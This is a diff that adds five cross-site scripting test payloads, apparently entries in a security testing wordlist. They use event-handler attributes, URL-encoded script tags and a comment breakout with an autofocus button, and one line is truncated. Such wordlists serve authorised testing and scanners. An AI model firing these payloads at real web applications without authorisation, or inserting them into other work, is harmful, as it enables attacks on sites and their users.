@@ -1,0 +1,5 @@
+1234<img+src+onerror%3d'alert(1)'>
+%27%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+FA_CERT%27%20onmouseover=alert(1)%20%27%22&
+%22%3E%3Cimage/src=%22//
+--><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS
